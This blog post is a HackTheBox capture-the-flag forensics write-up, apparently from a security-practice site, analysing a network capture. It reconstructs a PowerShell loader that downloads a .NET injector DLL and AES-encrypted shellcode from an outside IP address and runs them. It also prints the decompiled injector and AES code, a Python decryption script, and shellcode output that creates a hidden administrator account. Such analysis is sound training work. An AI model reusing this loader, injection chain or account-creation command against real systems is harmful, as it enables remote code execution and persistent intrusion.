---
layout: post
title: "HackTheBox - Red Failure"
date: 2026-03-19
category: "Security Practice｜HackTheBox"
tags: []
draft: false
toc: true
comments: true
---

# HackTheBox - Red Failure
<!-- more -->

* Challenge Scenario
    > During a recent red team engagement one of our servers got compromised. Upon completion the red team should have deleted any malicious artifact or persistence mechanism used throughout the project. However, our engineers have found numerous of them left behind. It is therefore believed that there are more such mechanisms still active. Can you spot any, by investigating this network capture?

## Recon
1. 觀察pcap的tcp stream以及dump中間傳輸的files
    ```bash
    $ file 4A7xH.ps1
    4A7xH.ps1: ASCII text
    $ file 9tVI0
    9tVI0: OpenPGP Public Key
    $ file user32.dll
    user32.dll: PE32 executable (DLL) (console) Intel 80386 Mono/.Net assembly, for MS Windows
    ```
2. 觀察powershell script，會發現是一個簡單但麻煩的字串拼接，簡單還原之後如下
    ```powershell
    sv "YuE51" ([Type]"System.Reflection.Assembly")
    ${B} = "147.182.172.189"
    ${h} = "notepad"
    ${I} = "explorer"

    ${methods} = @( "remotethread", "remotethreaddll", "remotethreadview", "remotethreadsuspend";)
    if (${methods}.Contains.Invoke("currentthread")){
    ${h} = (& "start-process" -WindowStyle "Hidden" -PassThru "notepad").Id
    }

    ${methods} = @( "remotethreadapc", "remotethreadcontext", "processhollow";)
    if (${methods}.Contains.Invoke("currentthread")){
    try {
    ${I} = (& "get-process" "explorer" -ErrorAction "Stop").Id
    }
    catch{
    ${I} = 0
    }
    }

    ${cmd} = "currentthread /sc:http://147.182.172.189:80/9tVI0 /password:z64&Rx27Z$B%73up /image:C:\Windows\System32\svchost.exe /pid:${h} /ppid:${I} /dll:msvcp_win.dll /blockDlls:True /am51:True"
    ${data} = (& "iwr" -UseBasicParsing "http://147.182.172.189:80/user32.dll").Content # Invoke-WebRequest http://147.182.172.189:80/user32.dll
    ${assem} = (ls "variable:yUE51").Value::Load.Invoke(${data}) # [System.Reflection.Assembly]::Load($data)
    ${Flags} = [Reflection.bindingflags]"NonPublicStatic"
    ${class} = ${assem}.Gettype.Invoke("DInjector.Detonator", ${Flags}) # [System.Reflection.Assembly]::Load($data).GetType("DInjector.Detonator", [Reflection.bindingflags]"NonPublicStatic") 也就是找到找到：namespace DInjector → class Detonator
    ${entry} = ${class}.Getmethod.Invoke("Boom", ${Flags}) # [System.Reflection.Assembly]::Load($data).GetType("DInjector.Detonator", [Reflection.bindingflags]"NonPublicStatic").Getmethod.Invoke("Boom", [Reflection.bindingflags]"NonPublicStatic") 也就是找到 DInjector.Detonator class中的 Boom 方法，這就是 payload 主函式
    ${entry}.Invoke(${null}, (, ${cmd}.Split.Invoke(" "))) # Boom(cmd.split(" "))
    ```
    也就是他會啟動`DInjector.Detonator`這個class的`Boom` method，所以就要實際看一下他在寫什麼
3. 用dn.Spy逆一下會發現關鍵的`Boom` method如下
    ```c#
            private static void Boom(string[] args)
            {
                ...
                string text = string.Empty;
                foreach (KeyValuePair<string, string> keyValuePair in dictionary)
                {
                    if (keyValuePair.Value == string.Empty)
                    {
                        text = keyValuePair.Key;
                    }
                }
                string text2 = dictionary["/sc"];
                string password = dictionary["/password"];
                byte[] data;
                if (text2.IndexOf("http", StringComparison.OrdinalIgnoreCase) >= 0)
                {
                    Console.WriteLine("(Detonator) [*] Loading shellcode from URL");
                    WebClient webClient = new WebClient();
                    ServicePointManager.SecurityProtocol = (SecurityProtocolType.Tls | SecurityProtocolType.Tls11 | SecurityProtocolType.Tls12);
                    MemoryStream memoryStream = new MemoryStream(webClient.DownloadData(text2));
                    data = new BinaryReader(memoryStream).ReadBytes(Convert.ToInt32(memoryStream.Length));
                }
                else
                {
                    Console.WriteLine("(Detonator) [*] Loading shellcode from base64 input");
                    data = Convert.FromBase64String(text2);
                }
                byte[] array = new AES(password).Decrypt(data);
                ...
    ```
    所以前面拿到的另外一個file(`9tVI0`)其實是一個經過AES加密的data，那麼要做的事情很簡單，就是去看他怎麼解密的
    ```c#
    namespace DInjector
    {
        // Token: 0x02000019 RID: 25
        internal class AES
        {
            // Token: 0x0600004C RID: 76 RVA: 0x00005689 File Offset: 0x00003889
            public AES(string password)
            {
                this.key = SHA256.Create().ComputeHash(Encoding.UTF8.GetBytes(password));
            }
            ...
            public byte[] Decrypt(byte[] data)
            {
                byte[] result;
                using (AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider())
                {
                    byte[] iv = data.Take(16).ToArray<byte>();
                    byte[] data2 = data.Skip(16).Take(data.Length - 16).ToArray<byte>();
                    aesCryptoServiceProvider.Key = this.key;
                    aesCryptoServiceProvider.IV = iv;
                    aesCryptoServiceProvider.Mode = CipherMode.CBC;
                    aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
                    using (ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateDecryptor(aesCryptoServiceProvider.Key, aesCryptoServiceProvider.IV))
                    {
                        result = this.PerformCryptography(cryptoTransform, data2);
                    }
                }
                return result;
            }
            ...
    ```
    重要的資訊如下

    | 項目         | 值                  |
    | ---------- | ------------------ |
    | Algorithm  | AES                |
    | Mode       | CBC                |
    | Key        | `SHA256(password)` |
    | IV         | 前 16 bytes         |
    | Ciphertext | 剩下的 bytes          |
    | Padding    | PKCS7              |

## Exploit
```python
from Crypto.Cipher import AES
from hashlib import sha256

# ===== 參數 =====
password = "z64&Rx27Z$B%73up"

# ===== 讀檔 =====
with open("9tVI0", "rb") as f:
    data = f.read()

# ===== Step 1: 切 IV =====
iv = data[:16]
ciphertext = data[16:]

# ===== Step 2: key derivation =====
key = sha256(password.encode("utf-8")).digest()

# ===== Step 3: AES-CBC 解密 =====
cipher = AES.new(key, AES.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)

# ===== Step 4: 去 PKCS7 padding =====
pad_len = decrypted[-1]
if pad_len > 0 and pad_len <= 16:
    decrypted = decrypted[:-pad_len]

# ===== Step 5: 輸出 =====
with open("shellcode.bin", "wb") as f:
    f.write(decrypted)

print("[+] Decryption complete")
print(decrypted)
```
解密完了之後回拿到一個意義不明的file，那就要繼續往下跟`Boom` method到底後續拿這個data做了什麼
```c#
FunctionPointerV2.Execute(array);
ProcessHollow.Execute(array, dictionary["/image"], ppid, blockDlls);
RemoteThread.Execute(array, int.Parse(dictionary["/pid"]));
RemoteThreadContext.Execute(array, dictionary["/image"], ppid, blockDlls);
...
```
從這幾個method的實作來看，他是把解密完的array當作shellcode，所以最後階段就是如何知道這一段shellcode在寫什麼，我是參考[^1]的說明才知道scdbg就可以直接看shellcode runtime的指令
```sh
Loaded 139 bytes from file D:\Downloads\Trash\shellcode.bin
Initialization Complete..
Max Steps: 2000000
Using base offset: 0x401000

4010b4  WinExec( net user jmiller "HTB{00000ps_1_t0t4lly_f0rg0t_1t}" /add; net localgroup administrators jmiller /add)
4010c0  GetVersion()
4010d3  ExitProcess(0)

Stepcount 554094
```

Flag: `HTB{00000ps_1_t0t4lly_f0rg0t_1t}`

## Reference
[^1]:[Red Failure](https://hackmd.io/@itspwgg/HJseFfZZ6?utm_source=preview-mode&utm_medium=rec)